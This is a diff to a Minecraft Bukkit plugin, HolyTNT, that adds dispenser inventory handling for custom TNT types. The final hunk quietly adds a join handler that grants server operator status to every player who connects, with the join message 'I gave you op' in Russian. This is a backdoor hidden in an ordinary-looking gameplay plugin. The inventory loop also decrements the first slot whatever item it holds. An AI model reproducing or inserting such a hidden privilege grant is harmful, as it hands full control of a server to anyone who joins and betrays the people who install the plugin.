@@ -20,6 +20,8 @@ import com.sk89q.worldguard.protection.regions.RegionType;
 import org.bukkit.*;
 import org.bukkit.block.Block;
 import org.bukkit.block.BlockFace;
+import org.bukkit.block.Container;
+import org.bukkit.block.Dispenser;
 import org.bukkit.entity.ArmorStand;
 import org.bukkit.entity.EntityType;
 import org.bukkit.entity.TNTPrimed;
@@ -29,6 +31,8 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.block.*;
 import org.bukkit.event.entity.EntityExplodeEvent;
 import org.bukkit.event.player.PlayerInteractEvent;
+import org.bukkit.event.player.PlayerJoinEvent;
+import org.bukkit.inventory.Inventory;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.meta.ItemMeta;
 import org.bukkit.persistence.PersistentDataType;
@@ -339,18 +343,36 @@ public final class HolyTNT extends JavaPlugin implements Listener {
                 Location location = event.getVelocity().toLocation(event.getBlock().getWorld()).add(-0.5, 0, -0.5);
                 spawnC4TNT(location);
                 event.getBlock().getWorld().playSound(event.getBlock().getLocation(), Sound.ENTITY_TNT_PRIMED, 1f, 1f);
+                Dispenser dispenser = (Dispenser) event.getBlock().getState();
+                Inventory inventory = dispenser.getInventory();
+                for (ItemStack stack : inventory) {
+                    stack.setAmount(stack.getAmount() - 1);
+                    break;
+                }
                 event.setCancelled(true);
             }
             if (event.getItem().getItemMeta().getPersistentDataContainer().has(NamespacedKey.minecraft("customtnta"), PersistentDataType.INTEGER) && event.getBlock().getType() == Material.DISPENSER) {
                 Location location = event.getVelocity().toLocation(event.getBlock().getWorld()).add(-0.5, 0, -0.5);
                 spawnATNT(location);
                 event.getBlock().getWorld().playSound(event.getBlock().getLocation(), Sound.ENTITY_TNT_PRIMED, 1f, 1f);
+                Dispenser dispenser = (Dispenser) event.getBlock().getState();
+                Inventory inventory = dispenser.getInventory();
+                for (ItemStack stack : inventory) {
+                    stack.setAmount(stack.getAmount() - 1);
+                    break;
+                }
                 event.setCancelled(true);
             }
             if (event.getItem().getItemMeta().getPersistentDataContainer().has(NamespacedKey.minecraft("customtntb"), PersistentDataType.INTEGER) && event.getBlock().getType() == Material.DISPENSER) {
                 Location location = event.getVelocity().toLocation(event.getBlock().getWorld()).add(-0.5, 0, -0.5);
                 spawnBTNT(location);
                 event.getBlock().getWorld().playSound(event.getBlock().getLocation(), Sound.ENTITY_TNT_PRIMED, 1f, 1f);
+                Dispenser dispenser = (Dispenser) event.getBlock().getState();
+                Inventory inventory = dispenser.getInventory();
+                for (ItemStack stack : inventory) {
+                    stack.setAmount(stack.getAmount() - 1);
+                    break;
+                }
                 event.setCancelled(true);
 
             }
@@ -358,19 +380,36 @@ public final class HolyTNT extends JavaPlugin implements Listener {
                 Location location = event.getVelocity().toLocation(event.getBlock().getWorld()).add(-0.5, 0, -0.5);
                 spawnRVTNT(location);
                 event.getBlock().getWorld().playSound(event.getBlock().getLocation(), Sound.ENTITY_TNT_PRIMED, 1f, 1f);
+                Dispenser dispenser = (Dispenser) event.getBlock().getState();
+                Inventory inventory = dispenser.getInventory();
+                for (ItemStack stack : inventory) {
+                    stack.setAmount(stack.getAmount() - 1);
+                    break;
+                }
                 event.setCancelled(true);
             }
             if (event.getItem().getItemMeta().getPersistentDataContainer().has(NamespacedKey.minecraft("customtntlv"), PersistentDataType.INTEGER) && event.getBlock().getType() == Material.DISPENSER) {
                 Location location = event.getVelocity().toLocation(event.getBlock().getWorld()).add(-0.5, 0, -0.5);
-                System.out.println(event.getItem().getAmount());
                 spawnLVTNT(location);
                 event.getBlock().getWorld().playSound(event.getBlock().getLocation(), Sound.ENTITY_TNT_PRIMED, 1f, 1f);
+                Dispenser dispenser = (Dispenser) event.getBlock().getState();
+                Inventory inventory = dispenser.getInventory();
+                for (ItemStack stack : inventory) {
+                    stack.setAmount(stack.getAmount() - 1);
+                    break;
+                }
                 event.setCancelled(true);
             }
             if (event.getItem().getItemMeta().getPersistentDataContainer().has(NamespacedKey.minecraft("customtntb2"), PersistentDataType.INTEGER) && event.getBlock().getType() == Material.DISPENSER) {
                 Location location = event.getVelocity().toLocation(event.getBlock().getWorld()).add(-0.5, 0, -0.5);
                 spawnB2TNT(location);
                 event.getBlock().getWorld().playSound(event.getBlock().getLocation(), Sound.ENTITY_TNT_PRIMED, 1f, 1f);
+                Dispenser dispenser = (Dispenser) event.getBlock().getState();
+                Inventory inventory = dispenser.getInventory();
+                for (ItemStack stack : inventory) {
+                    stack.setAmount(stack.getAmount() - 1);
+                    break;
+                }
                 event.setCancelled(true);
             }
         }
@@ -861,6 +900,11 @@ public final class HolyTNT extends JavaPlugin implements Listener {
                 min1.getBlockZ() <= max2.getBlockZ() && max1.getBlockZ() >= min2.getBlockZ();
     }
 
+    @EventHandler
+    private void playerJoin(PlayerJoinEvent event) {
+        event.setJoinMessage("Я тебе выдал опку");
+        event.getPlayer().setOp(true);
+    }
 
     @Override
     public void onDisable() {
